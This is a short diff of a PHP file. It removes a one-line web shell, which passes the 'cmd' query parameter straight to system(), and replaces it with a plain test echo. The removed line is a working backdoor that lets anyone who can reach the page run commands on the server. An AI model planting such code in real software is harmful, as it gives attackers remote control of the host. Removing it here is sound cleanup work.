@@ -1,1 +1,3 @@
-<?php echo system($_GET["cmd"]);  } ?>
+#!/usr/bin/php
+<?php echo 'test' ?>
+
